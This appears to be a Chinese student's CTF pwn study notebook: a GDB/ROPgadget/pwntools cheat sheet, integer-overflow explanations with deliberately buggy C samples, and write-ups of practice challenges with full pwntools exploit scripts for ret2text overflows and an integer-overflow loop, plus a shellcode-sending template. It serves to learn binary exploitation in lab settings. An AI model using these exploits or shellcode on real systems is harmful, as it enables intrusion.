**目录：**

**学习笔记**

[PWN核心指令集](https://www.yuque.com/danguchunliwuzhifangsuan/uog21n/gpil76yw1r2fewxi)

[Pwntools 使用指南](https://www.yuque.com/danguchunliwuzhifangsuan/uog21n/zgdepyw3ddf00hgg)

[整数溢出](https://www.yuque.com/danguchunliwuzhifangsuan/uog21n/fsbkptppnqg3dify)

**练习：**

[text_your_nc & IDA & ret2text](https://www.yuque.com/danguchunliwuzhifangsuan/uog21n/xqulhaze01xkr953)

# 学习笔记
## PWN核心指令集
[深入解析：pwn知识点——命令篇 - tlnshuju - 博客园](https://www.cnblogs.com/tlnshuju/p/19094173)

### 1. 基础文件与系统操作
+ **文件管理**: `ls`, `cd`, `cat` (读取 flag), `chmod` (添加执行权限 `chmod +x`)。
+ **信息搜索**: `find`, `grep` (搜索关键字符串)。
+ **文件属性**: `file` (判断文件类型、架构)。

### 2. 网络连接与进程管理
+ **网络工具**: `nc` (连接靶机/监听), `ping`, `ifconfig`。
+ **系统状态**: `ps`, `kill`, `uname`。

### 3. Pwn 专用工具链
+ `checksec`: 检查二进制文件的安全保护机制（NX, PIE, Canary, RELRO）。
+ `gdb`: GNU 调试器，配合插件（pwndbg, gef, peda）进行动态调试。
    - 程序加载与执行控制
    - 断点设置与调试流程控制
    - 寄存器和内存查看
    - 单步调试与指令跟踪
+ `ROPgadget`: 查找二进制文件中的 ROP gadgets，用于构造 ROP 链。
+ `pwntools`: Python 漏洞利用库，用于编写 Exploit 脚本。

### 4. 典型分析流程
1. **检查保护**: 使用 `checksec` 确认安全机制。
2. **查看类型**: 使用 `file` 确认架构（32/64位）。
3. **赋权运行**: `chmod +x` 后尝试运行。
4. **逆向分析**: 使用 IDA 分析逻辑。
5. **调试利用**: GDB 调试并编写脚本。

---

## 🚀 高频指令速查表
在 CTF Pwn 比赛中，以下指令使用率最高，是解题的基础：

| 指令/工具 | 用途 | 核心价值 | 实例 |
| :--- | :--- | :--- | :--- |
| `checksec [filename]` | **检查安全机制** | **第一步必做**。判断是否开启 NX, PIE, Canary，直接决定攻击策略（如是否需 ROP）。 | **** |
| `file [filename]` | **查看文件属性** | 确认是 32位还是 64位（决定用 `p32` 还是 `p64`），以及符号表状态。 |  |
| `ROPgadget`<br/>`ROPgadget --binary [filename] --only "pop|ret"` | **寻找 ROP 链** | 搜索 `pop rdi; ret` 等指令片段，用于绕过 NX 保护。 |  |
| `gdb ./[filename]` | **动态调试** | 观察寄存器、内存变化，定位漏洞点。常用指令：`r`, `c`, `si`, `x/20wx`。 |  |
| `from pwn import *` | **编写 Exp** | 脚本开头。利用 `process` 或 `remote` 交互，实现自动化获取 flag。 |  |




### ROPgadget用法：
```c
# 搜索pop/ret组合
ROPgadget --binary ./vuln --only "pop|ret"

# 搜索特定寄存器控制
ROPgadget --binary ./vuln --only "pop rdi" --range 0x400000-0x401000

# 搜索所有可用gadget
ROPgadget --binary ./vuln
```

### GDB极简版用法：
```plain
# 基础操作
(gdb) r                    # 运行程序
(gdb) c                    # 继续执行
(gdb) q                    # 退出GDB

# 断点操作
(gdb) b main               # 在main函数设置断点
(gdb) b *0x400500          # 在指定地址设置断点
(gdb) info b               # 查看所有断点

# 调试操作
(gdb) si                   # 单步执行一条指令
(gdb) ni                   # 单步执行，跳过函数调用
(gdb) finish               # 执行完当前函数

# 查看信息
(gdb) i r                  # 查看所有寄存器
(gdb) x/20wx $rsp          # 以16进制查看栈上20个字
(gdb) x/10i $rip           # 查看当前指令附近的汇编代码
```

[GDB动态调试](https://www.yuque.com/danguchunliwuzhifangsuan/uog21n/onunucu4n1ncgy1y)

### `from pwn import *`pwntools核心功能：
#### 连接方式：
```python
# 本地程序
p = process('./vuln')

# 远程连接
p = remote('chall.example.com', 1234)
```

#### 数据打包：
```python
p32(0x12345678)    # 32位数据打包
p64(0x1234567890abcdef) # 64位数据打包
u32(b'\x78\x56\x34\x12') # 32位数据解包
u64(b'\xef\xcd\xab\x90\x78\x56\x34\x12') # 64位数据解包
```

#### 交互操作：
```python
p.recv()           # 接收数据
p.recvuntil(b':')   # 接收直到指定字符串
p.send(b'payload') # 发送数据
p.interactive()    # 交互模式
```

---

## 💡 关键命令深度解析
### 1. `file` 命令
通过解读输出信息（如 `ELF 64-bit LSB executable`），判断：

+ **架构**: x86-64 或 i386。
+ **链接**: 动态链接或静态链接。
+ **符号表**: `not stripped` 表示有符号表，便于分析；`stripped` 表示无符号表，需手动分析。

### 2. `checksec` 命令
+ **RELRO**: 部分或完全开启会影响 GOT 表的可写性。
+ **STACK CANARY**: 开启后需先泄露 Canary 值才能溢出。
+ **NX (Non-Executable)**: 开启后栈不可执行，需使用 ROP 技术。
+ **PIE**: 地址随机化，需先泄露基址。
+ **CANARY** : 栈保护开启

### 3. `gdb` 命令
+ **断点**: `b *main`, `b *0x401123`
+ **查看内存**: `x/20wx $rsp` (以十六进制查看栈顶20个单位)
+ **查看寄存器**: `i r` (info registers)



## Pwntools使用指南
[pwntools入门指南-CSDN博客](https://blog.csdn.net/qq_29343201/article/details/51337025?biz_id=&ops_request_misc=&request_id=94f9871076fb47db9e680e05d81684ea&utm_term=pwntools%E5%AE%89%E8%A3%85)

> Pwntools 是一个用 Python 开发的 CTF 框架和漏洞利用开发库，旨在让使用者简单快速地编写 Exploit（漏洞利用代码）。
>

## 1. 基础框架代码
这是编写 Exploit 的标准模板，包含了导入模块、环境设置、连接目标、发送 Payload 和交互等基本步骤

```python
from pwn import *  # 导入所有模块

# 设置目标环境（架构、操作系统、日志等级）
context(os='linux', arch='amd64', log_level='debug')

# 连接目标（二选一）
r = remote('exploitme.example.com', 31337)  # 远程连接
# r = process("./test")  # 本地进程调试

# 发送 Payload
r.send(asm(shellcraft.sh()))  # 汇编并发送 Shellcode

r.interactive()  # 交互模式，接管控制权
```

## <font style="background-color:rgba(255, 255, 255, 0);">2. 环境上下文 (Context)</font>
<font style="background-color:rgba(255, 255, 255, 0);">由于 32 位和 64 位汇编及系统调用不同，必须设置上下文环境以避免错误。</font>

+ **<font style="background-color:rgba(255, 255, 255, 0);">设置命令</font>**<font style="background-color:rgba(255, 255, 255, 0);">：</font>`<font style="background-color:rgba(255, 255, 255, 0);">context(os='linux', arch='amd64', log_level='debug')</font>`
+ **<font style="background-color:rgba(255, 255, 255, 0);">关键参数说明</font>**<font style="background-color:rgba(255, 255, 255, 0);">：</font>

| **<font style="background-color:rgba(255, 255, 255, 0);">参数</font>** | **<font style="background-color:rgba(255, 255, 255, 0);">值示例</font>** | **<font style="background-color:rgba(255, 255, 255, 0);">说明</font>** |
| :--- | :--- | :--- |
| **<font style="background-color:rgba(255, 255, 255, 0);">os</font>** | `<font style="background-color:rgba(255, 255, 255, 0);">linux</font>` | <font style="background-color:rgba(255, 255, 255, 0);">操作系统类型，CTF 题目通常为 Linux。</font> |
| **<font style="background-color:rgba(255, 255, 255, 0);">arch</font>** | `<font style="background-color:rgba(255, 255, 255, 0);">amd64</font>`<br/><font style="background-color:rgba(255, 255, 255, 0);"> </font><font style="background-color:rgba(255, 255, 255, 0);">/</font><font style="background-color:rgba(255, 255, 255, 0);"> </font>`<font style="background-color:rgba(255, 255, 255, 0);">i386</font>` | <font style="background-color:rgba(255, 255, 255, 0);">架构设置，</font>`<font style="background-color:rgba(255, 255, 255, 0);">amd64</font>`<br/><font style="background-color:rgba(255, 255, 255, 0);"> </font><font style="background-color:rgba(255, 255, 255, 0);">代表 64 位，</font>`<font style="background-color:rgba(255, 255, 255, 0);">i386</font>`<br/><font style="background-color:rgba(255, 255, 255, 0);"> </font><font style="background-color:rgba(255, 255, 255, 0);">代表 32 位。</font> |
| **<font style="background-color:rgba(255, 255, 255, 0);">log_level</font>** | `<font style="background-color:rgba(255, 255, 255, 0);">debug</font>` | <font style="background-color:rgba(255, 255, 255, 0);">日志等级，设为 debug 可打印完整 IO 过程，方便调试。</font> |


## <font style="background-color:rgba(255, 255, 255, 0);">3. 数据打包与解包 (Pack/Unpack)</font>
<font style="background-color:rgba(255, 255, 255, 0);">在构造栈溢出 Payload 时，需要将整数转换为内存地址格式（小端序）。</font>

+ **<font style="background-color:rgba(255, 255, 255, 0);">打包 (Pack)</font>**<font style="background-color:rgba(255, 255, 255, 0);">：将整数转为字节流。</font>
    - `<font style="background-color:rgba(255, 255, 255, 0);">p32(0xdeadbeef)</font>`<font style="background-color:rgba(255, 255, 255, 0);">：打包 32 位数据。</font>
    - `<font style="background-color:rgba(255, 255, 255, 0);">p64(0xdeadbeef)</font>`<font style="background-color:rgba(255, 255, 255, 0);">：打包 64 位数据。</font>
+ **<font style="background-color:rgba(255, 255, 255, 0);">解包 (Unpack)</font>**<font style="background-color:rgba(255, 255, 255, 0);">：将字节流转为整数。</font>
    - `<font style="background-color:rgba(255, 255, 255, 0);">u32(data)</font>`<font style="background-color:rgba(255, 255, 255, 0);">：解包 32 位数据。</font>
    - `<font style="background-color:rgba(255, 255, 255, 0);">u64(data)</font>`<font style="background-color:rgba(255, 255, 255, 0);">：解包 64 位数据。</font>

**<font style="background-color:rgba(255, 255, 255, 0);">示例</font>**<font style="background-color:rgba(255, 255, 255, 0);">：</font>

```python
payload = p32(0xdeadbeef) # 将 0xdeadbeef 转换为适合 32 位系统的字节序
```

## <font style="background-color:rgba(255, 255, 255, 0);">4. Cyclic Pattern (循环模式)</font>
<font style="background-color:rgba(255, 255, 255, 0);">这是一个强大的调试工具，用于快速定位栈溢出的覆盖位置（偏移量）。</font>

+ **<font style="background-color:rgba(255, 255, 255, 0);">生成模式</font>**<font style="background-color:rgba(255, 255, 255, 0);">：</font>`<font style="background-color:rgba(255, 255, 255, 0);">cyclic(长度)</font>`<font style="background-color:rgba(255, 255, 255, 0);"> </font><font style="background-color:rgba(255, 255, 255, 0);">生成一个特定的长字符串。</font>
+ **<font style="background-color:rgba(255, 255, 255, 0);">定位偏移</font>**<font style="background-color:rgba(255, 255, 255, 0);">：输入后若寄存器（如 EIP/PC）变为特定值（如</font><font style="background-color:rgba(255, 255, 255, 0);"> </font>`<font style="background-color:rgba(255, 255, 255, 0);">0x61616161</font>`<font style="background-color:rgba(255, 255, 255, 0);">），使用</font><font style="background-color:rgba(255, 255, 255, 0);"> </font>`<font style="background-color:rgba(255, 255, 255, 0);">cyclic_find(值)</font>`<font style="background-color:rgba(255, 255, 255, 0);"> </font><font style="background-color:rgba(255, 255, 255, 0);">即可算出从第几个字节开始覆盖了返回地址。</font>

**<font style="background-color:rgba(255, 255, 255, 0);">示例</font>**<font style="background-color:rgba(255, 255, 255, 0);">：</font>

```python
# 生成 256 字节的 pattern
pattern = cyclic(0x100)

# 假设程序崩溃时 EIP 为 0x61616161
offset = cyclic_find(0x61616161) # 计算出偏移量
print(offset) # 输出结果即为填充的字节数
```

## <font style="background-color:rgba(255, 255, 255, 0);">5. 汇编与 Shellcode</font>
<font style="background-color:rgba(255, 255, 255, 0);">Pwntools 内置了简单的汇编引擎和 Shellcode 生成器。</font>

+ **<font style="background-color:rgba(255, 255, 255, 0);">生成 Shellcode</font>**<font style="background-color:rgba(255, 255, 255, 0);">：</font>`<font style="background-color:rgba(255, 255, 255, 0);">shellcraft.sh()</font>`<font style="background-color:rgba(255, 255, 255, 0);"> </font><font style="background-color:rgba(255, 255, 255, 0);">生成调用</font><font style="background-color:rgba(255, 255, 255, 0);"> </font>`<font style="background-color:rgba(255, 255, 255, 0);">/bin/sh</font>`<font style="background-color:rgba(255, 255, 255, 0);"> </font><font style="background-color:rgba(255, 255, 255, 0);">的汇编代码。</font>
+ **<font style="background-color:rgba(255, 255, 255, 0);">汇编机器码</font>**<font style="background-color:rgba(255, 255, 255, 0);">：</font>`<font style="background-color:rgba(255, 255, 255, 0);">asm(汇编代码)</font>`<font style="background-color:rgba(255, 255, 255, 0);"> </font><font style="background-color:rgba(255, 255, 255, 0);">将汇编代码转为机器码。</font>

**<font style="background-color:rgba(255, 255, 255, 0);">注意</font>**<font style="background-color:rgba(255, 255, 255, 0);">：</font>`<font style="background-color:rgba(255, 255, 255, 0);">asm</font>`<font style="background-color:rgba(255, 255, 255, 0);"> </font><font style="background-color:rgba(255, 255, 255, 0);">功能目前有局限（不支持相对跳转等复杂指令），复杂需求建议使用 Keystone-engine。</font>

**<font style="background-color:rgba(255, 255, 255, 0);">用法：</font>**

```python
cyclic(0x100) # 生成一个0x100大小的pattern，即一个特殊的字符串
cyclic_find(0x61616161) # 找到该数据在pattern中的位置
cyclic_find('aaaa') # 查找位置也可以使用字符串去定位
```

**<font style="background-color:rgba(255, 255, 255, 0);">示例</font>**<font style="background-color:rgba(255, 255, 255, 0);">：</font>

```python
# 打印 /bin/sh 的汇编代码
print(shellcraft.sh())

# 打印汇编后的机器码 (注意：需先设置 context)
print(asm(shellcraft.sh()))
```

## <font style="background-color:rgba(255, 255, 255, 0);">6. 数据输出 (Log)</font>
<font style="background-color:rgba(255, 255, 255, 0);">推荐使用 Pwntools 自带的日志功能输出信息，格式更统一。</font>

+ **<font style="background-color:rgba(255, 255, 255, 0);">用法</font>**<font style="background-color:rgba(255, 255, 255, 0);">：</font>`<font style="background-color:rgba(255, 255, 255, 0);">log.info("信息内容")</font>`

**<font style="background-color:rgba(255, 255, 255, 0);">示例</font>**<font style="background-color:rgba(255, 255, 255, 0);">：</font>

```python
some_str = "hello, world"
log.info(some_str)
```



## 整数溢出
[整数溢出 - CTF Wiki](https://ctf-wiki.org/pwn/linux/user-mode/integeroverflow/introduction/)

# 整数溢出技术总结
## 概述
整数溢出是CTF竞赛中常见的漏洞类型，当程序中的数据超过其数据类型的范围时会发生溢出。在C语言中，整数的基本数据类型包括短整型(short)、整型(int)、长整型(long)，这些类型又分为有符号和无符号两种。

## 数据类型范围（64位gcc-5.4环境）
| 类型 | 字节 | 范围 |
| --- | --- | --- |
| short int | 2byte | -32768~-1(0x8000~0xffff) / 0~32767(0~0x7fff) |
| unsigned short int | 2byte | 0~65535(0~0xffff) |
| int | 4byte | -2147483648~-1(0x80000000~0xffffffff) / 0~2147483647(0~0x7fffffff) |
| unsigned int | 4byte | 0~4294967295(0~0xffffffff) |
| long int | 8byte | 0x8000000000000000~0xffffffffffffffff / 0~0x7fffffffffffffff |
| unsigned long int | 8byte | 0~0xffffffffffffffff |


## 溢出原理
### 上界溢出
**情况一：0x7fff + 1**

+ 有符号短整型：32767 + 1 = -32768
+ 无符号短整型无影响

**情况二：0xffff + 1**

+ 有符号：等效为 -1 + 1 = 0 ，无影响
+ 无符号：65535 + 1 = 0

### 下界溢出
**情况一：0x0000 - 1**

+ 有符号：0 - 1 = -1 ，无影响
+ 无符号：0 - 1 = 65535

**情况二：0x8000 - 1**

+ 有符号：-32768 - 1 = 32767
+ 无符号：32768 - 1 = 32767 ，无影响

## 漏洞类型
### 1. 未限制范围
当程序对变量范围没有进行有效约束时，可能导致整数溢出。

**示例代码：**

```c
$ cat test.c
#include<stddef.h>
int main(void)
{
    int len;
    int data_len;
    int header_len;
    char *buf;

    header_len = 0x10;
    scanf("%uld", &data_len);

    len = data_len+header_len
    buf = malloc(len);
    read(0, buf, data_len);
    return 0;
}
$ gcc test.c
$ ./a.out
-1
asdfasfasdfasdfafasfasfasdfasdf
# gdb a.out
► 0x40066d <main+71>    call   malloc@plt <0x400500>
        size: 0xf
```

**漏洞分析：**

+ 输入-1时，len = 0xffffffff + 0x10 = 0xf
+ 实际申请0x20大小的堆，但可以输入0xffffffff长度的数据
+ 从整型溢出导致堆溢出

### 2. 错误的类型转换
即使对变量进行了约束，错误的类型转换仍可能导致整数溢出。

#### 类型一：范围大的变量赋值给范围小的变量
```c
$ cat test2.c
void check(int n)
{
    if (!n)
        printf("vuln");
    else
        printf("OK");
}

int main(void)
{
    long int a;

    scanf("%ld", &a);
    if (a == 0)
        printf("Bad");
    else
        check(a);
    return 0;
}
$ gcc test2.c
$ ./a.out
4294967296
vuln
```

**漏洞分析：**

+ <font style="color:rgba(0, 0, 0, 0.87);">上述代码就是一个范围大的变量 (长整型 a)，传入 check 函数后变为范围小的变量 (整型变量 n)，造成整数溢出的例子。</font>
+ <font style="color:rgba(0, 0, 0, 0.87);">长整型的占有 8 byte 的内存空间，而整型只有 4 byte 的内存空间，所以当 long -> int，将会造成截断，只把长整型的低 4byte 的值传给整型变量。</font>
+ <font style="color:rgba(0, 0, 0, 0.87);">在上述例子中，就是把 </font>`long: 0x100000000 -> int: 0x00000000`<font style="color:rgba(0, 0, 0, 0.87);">。</font>



#### 类型二：只做了单边限制
```c
$ cat test3.c
int main(void)
{
    int len, l;
    char buf[11];

    scanf("%d", &len);
    if (len < 10) {
        l = read(0, buf, len);
        *(buf+l) = 0;
        puts(buf);
    } else
        printf("Please len < 10");        
}
$ gcc test3.c
$ ./a.out
-1
aaaaaaaaaaaa
aaaaaaaaaaaa
```

**漏洞分析：**

+ <font style="color:rgba(0, 0, 0, 0.87);">从表面上看，我们对变量 len 进行了限制，但是len 是有符号整型，所以 len 的长度可以为负数，但是在 read 函数中，第三个参数的类型是 </font>`size_t`<font style="color:rgba(0, 0, 0, 0.87);">，该类型相当于 </font>`unsigned long int`<font style="color:rgba(0, 0, 0, 0.87);">，属于无符号长整型</font>
+ 输入-1时，实际读取长度为0xffffffff

**<font style="color:rgba(0, 0, 0, 0.87);">上面举例的两种情况都有一个共性，就是函数的形参和实参的类型不同，所以我认为可以总结为错误的类型转换</font>**

## CTF应用
整数溢出漏洞在CTF题目中常用于：

+ 堆溢出利用
+ 内存越界访问
+ 条件判断绕过
+ 长度验证绕过

## 关键要点
+ 整数溢出是由于数据超过类型范围导致的
+ 有符号和无符号整数的溢出行为不同
+ 汇编指令不区分有符号/无符号，编译器层面进行区分
+ 漏洞主要分为范围未限制和类型转换错误两类
+ CTF中常用于构造堆溢出等更严重的漏洞



# 练习
## text_your_nc
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/61872331/1775815130403-067d3021-e73a-41fc-8cf0-700c05e744c2.png)

做过了不多赘述

## door
### 相关信息
+ ID：danguchun
+ 方向：pwn
+ 日期：2026/4/11
+ 来源：NewStar CTF 2025 Week 1
+ 题目名称：door
+ 漏洞类型：后门？
+ 操作系统：Linux

### 解题过程
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/61872331/1775882109951-f9e0db72-85a1-4323-9d81-454dea24b945.png)

1. `checksec`程序信息，得到64位系统
2. IDA中反编译，得到输入神秘小数字 `7038329`即可获得`system("/bin/sh")`<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/61872331/1775882164721-d2eb488b-596d-4745-8ed6-b40161a40f38.png)
3. 因为只能打本地，所以`cat flag`出不来

## INTbug
### 相关信息
+ ID：danguchun
+ 方向：pwn
+ 日期：2026/4/11
+ 来源：NewStar CTF 2025 Week 1
+ 题目名称：INTbug
+ 漏洞类型：整数溢出
+ 操作系统：Linux

### 解题过程
1. checksec文件信息，是64位

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/61872331/1775898503677-75eab2f2-a161-4090-a00e-7a045da32fa2.png)

2. IDA中反编译发现变量`v1`作为有符号整型（-32768~32767），可以在满足`v2>0`的情况下无限自加，所以只要循环32768次就能让`v1`整数溢出（`32767+1=-32768`），进入`system("cat flag")`分支

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/61872331/1775898797993-22176014-e65e-4587-b497-1fac5eab404c.png)

3. 编写exp

```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
p=process("./INTbug")

payload=b'1'

p.recvuntil(b'welcome to NewStarCTF2025!\n')

for i in range(32768):
    p.sendline(payload)
    
p.interactive()
```

4. 本地原因cat flag

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/61872331/1775898903836-6aab6f6f-4537-41f3-bd82-0ab273da68fc.png)

### 完整exp
```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
p=process("./INTbug")

payload=b'1'

p.recvuntil(b'welcome to NewStarCTF2025!\n')

for i in range(32768):
    p.sendline(payload)
    
p.interactive()
```



## pwn_37
### 相关信息
+ ID：danguchun
+ 方向：pwn
+ 日期：2026/4/13
+ 来源：CTF show
+ 题目名称：pwn_37
+ 漏洞类型：ret2text
+ 操作系统：Linux

### 解题过程
1. checksec，得到32位，且只打开了NX，可以栈溢出到指定地址

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/61872331/1776010441139-3e78931f-70b4-4032-8103-c445766cd7fb.png)

2. IDA中反编译可见，`buf`长度为0x12，`read`却能输入0x32，从这里切入

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/61872331/1776010832586-22877cac-3ec3-4527-a360-2efff64656bd.png)

3. 函数列表中有一个比`system`更好用的`backdoor`(0x08048521) ，溢出到这里就行

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/61872331/1776011382002-36dd593e-8bad-4bf6-ba6f-ce52b368a2af.png)<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/61872331/1776011381671-877655a8-0b00-4f56-b01c-3249e69740a4.png)

4. 偏移计算 padding=0x12+4，写出exp

```python
from pwn import *
context(os='linux', arch='i386', log_level='debug')
p=process("./pwn_37")

padding=0x12+4
backdoor=0x08048521
payload=b'a'*padding+p32(backdoor)

p.recvuntil("Just very easy ret2text&&32bit")
p.sendline(payload)

p.interactive()
```

5. 本地原因就`ls`了

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/61872331/1776012132966-0e069969-bcdf-40f1-ac98-c1f4ffde2591.png)

### 完整exp
```python
from pwn import *
context(os='linux', arch='i386', log_level='debug')
p=process("./pwn_37")

padding=0x12+4
backdoor=0x08048521
payload=b'a'*padding+p32(backdoor)

p.recvuntil("Just very easy ret2text&&32bit")
p.sendline(payload)

p.interactive()
```

## pwn_38
### 相关信息
+ ID：danguchun
+ 方向：pwn
+ 日期：2026/4/13
+ 来源：CTF show
+ 题目名称：pwn_38
+ 漏洞类型：ret2text
+ 操作系统：Linux

### 解题过程
1. checksec，64位，只有 NX 可以直接栈溢出

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/61872331/1776045495926-6caa99ab-3ded-4ae9-a133-1d7f60e6a15f.png)

2. IDA反编译，依旧`buf`可以溢出攻击，偏移量为`padding = 0xA + 8`，也有`backdoor`后门函数

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/61872331/1776045568230-0e0c80d6-a3e8-4d91-9939-e6a212eb654b.png)<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/61872331/1776045568845-357d4ebb-73b2-45d1-8c46-7000c2f706dc.png)

3. 这里尝试将函数列表里的`backdoor`的地址直接填进去

```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
p=process("./pwn_38")

padding=0xA+8
backdoor=0x0000000000400657
payload=b'a'*padding+p64(backdoor)

p.recvuntil("Just easy ret2text&&64bit")
p.sendline(payload)

p.interactive()
```

发现报错，鉴于前车之鉴，我就估计是栈没对齐

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/61872331/1776045875607-b3910f8d-2827-435d-9a3f-652283036455.png)

4. 重新回去找`backdoor`的地址，尝试将`push rbp`跳过，因为`push rbp`压栈会压入8字节，而<font style="color:rgb(6, 10, 38);">在调用函数（如 </font>`<font style="color:rgb(6, 10, 38);">system</font>`<font style="color:rgb(6, 10, 38);">）时，</font>`<font style="color:rgb(6, 10, 38);">RSP % 16 == 0</font>`<font style="color:rgb(6, 10, 38);">。</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/61872331/1776046022883-c9d17f73-73f3-402b-837e-df9db04130e4.png)

5. 直接写`mov`那行的地址，反正我也用不到返回调用函数

```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
p=process("./pwn_38")

padding=0xA+8
backdoor=0x0000000000400658
payload=b'a'*padding+p64(backdoor)

p.recvuntil("Just easy ret2text&&64bit")
p.sendline(payload)

p.interactive()
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/61872331/1776046330610-4ee90732-919b-44b4-a727-a6b73d0f9c1c.png)

### 完整exp
```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
p=process("./pwn_38")

padding=0xA+8
backdoor=0x0000000000400658
payload=b'a'*padding+p64(backdoor)

p.recvuntil("Just easy ret2text&&64bit")
p.sendline(payload)

p.interactive()
```

### 坑&指南
64位程序往往需要注意栈对齐，因为要求`<font style="color:rgb(6, 10, 38);">RSP % 16 == 0</font>`<font style="color:rgb(6, 10, 38);">，而调用函数时一般会有一句</font>`<font style="color:rgb(6, 10, 38);">push rbp</font>`<font style="color:rgb(6, 10, 38);">压入8字节，且该问题比较常有，建议报错时第一个排查栈对齐（32位不用注意）</font>

**<font style="color:rgb(6, 10, 38);">解决方式：</font>**

1. <font style="color:rgb(6, 10, 38);">确定不用返回调用函数时，可以直接跳过</font>`<font style="color:rgb(6, 10, 38);">push rbp</font>`<font style="color:rgb(6, 10, 38);">，自然就不会多出八字节</font>
2. <font style="color:rgb(6, 10, 38);">在覆盖返回地址时，目标函数地址前加一个</font>`ret`（或者叫 `pop rbp; ret` 等 gadget），`ret`本身就只是一种空格，能增加8字节而不影响程序（`**<font style="color:rgb(6, 10, 38);background-color:rgba(6, 10, 38, 0.06);">p64(ret_gadget) + p64(system_addr)</font>**`）

